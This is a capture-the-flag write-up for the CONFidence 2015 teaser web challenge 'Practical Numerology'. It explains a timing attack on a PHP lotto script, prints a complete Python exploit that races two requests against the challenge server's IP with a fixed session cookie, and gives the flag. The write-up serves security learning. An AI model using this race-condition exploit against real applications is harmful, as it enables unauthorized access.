# CONFidence CTF Teaser Practical Numerology

**Category:** Web
**Points:** 300
**Solves:** 56
**Description:**

> Here's a [lotto script](index.php), running on my [old and slow computer](134.213.136.172). Can you pwn it?  

## Write-up

### Explanation

This challenge was a timing attack against the server. The server performs the following steps when we give him a wrong guess:

 1. Outputs the expected answer.
 2. Outputs the guess we provided.
 3. Updates the session with a new answer.
 
If we manage the make the step 2 take relatively long amount of time, we can have a window where we know the expected answer and it hasn't been updated yet. To make the step 2 take a long amount of time, we can simply send a guess with a really long value. In the example below, I used a value with a length of 1000000. 

### Script

	import httplib
	import thread

	# Shared value that the first thread will write the expected value
	aaa = ""

	# Thread 1 does the request that take a long amount of time and sends the
	# results to Thread 2 with the shared value.
	def thread1(abc):
		global aaa

		try:
			headers = {
				"Content-Type": "application/x-www-form-urlencoded",
				"Cookie": "PHPSESSID=1337cookie"
			}
			conn1 = httplib.HTTPConnection("134.213.136.172")
			conn1.request("POST", "/", "guess=" + ("a"*1000000), headers)
			
			# Reading only the expected value will not wait for everything to be received.
			g = conn1.getresponse().read(92)
			
			# Sending it to Thread 2
			aaa = g[8:8+80]
		except Exception:
			import traceback
			print traceback.format_ex
		
	# Thread 2 receives the value from Thread 1 and sends it before the flag 
	# is updated.
	def thread2(abc):
		global aaa

		try:
			conn2 = httplib.HTTPConnection("134.213.136.172")
			headers = {
				"Content-Type": "application/x-www-form-urlencoded",
				"Cookie": "PHPSESSID=1337cookie"
			}
			
			while aaa == "":
				pass
				
			conn2.request("POST", "/", "guess=" + aaa, headers)
			a = conn2.getresponse().read()
			
			# This will output the flag if we sent it just in time.
			print(a)
		except Exception:
			import traceback
			print traceback.format_ex
		
		
	thread.start_new_thread(thread1, ("test",))
	thread.start_new_thread(thread2, ("test",))

	while 1:
	   pass
	   
### Flag

DrgnS{JustThinkOutOfTheBoxSometimes...}

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CONFIDENCE_TEASER/web/practicalnumerology>
